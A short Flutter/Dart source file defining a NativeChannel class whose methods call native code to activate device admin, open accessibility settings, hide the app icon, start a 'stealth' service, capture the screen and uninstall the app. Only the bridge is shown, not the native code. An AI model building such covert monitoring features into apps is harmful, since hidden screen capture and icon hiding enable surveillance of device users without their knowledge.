import 'package:flutter/services.dart';

class NativeChannel {
  static const _channel = MethodChannel('com.surokkhanet/native');

  static Future<bool> activateDeviceAdmin() async {
    return await _channel.invokeMethod('activateDeviceAdmin');
  }

  static Future<bool> openAccessibilitySettings() async {
    return await _channel.invokeMethod('openAccessibilitySettings');
  }

  static Future<bool> hideAppIcon() async {
    return await _channel.invokeMethod('hideAppIcon');
  }

  static Future<bool> startStealthService() async {
    return await _channel.invokeMethod('startStealthService');
  }

  static Future<String?> captureScreen() async {
    return await _channel.invokeMethod('captureScreen');
  }

  static Future<bool> removeDeviceAdmin() async {
    return await _channel.invokeMethod('removeDeviceAdmin');
  }

  static Future<bool> uninstallSelf() async {
    return await _channel.invokeMethod('uninstallSelf');
  }

  static Future<bool> lockDevice() async {
    // stub for example - implement native lock if possible
    return true;
  }
}
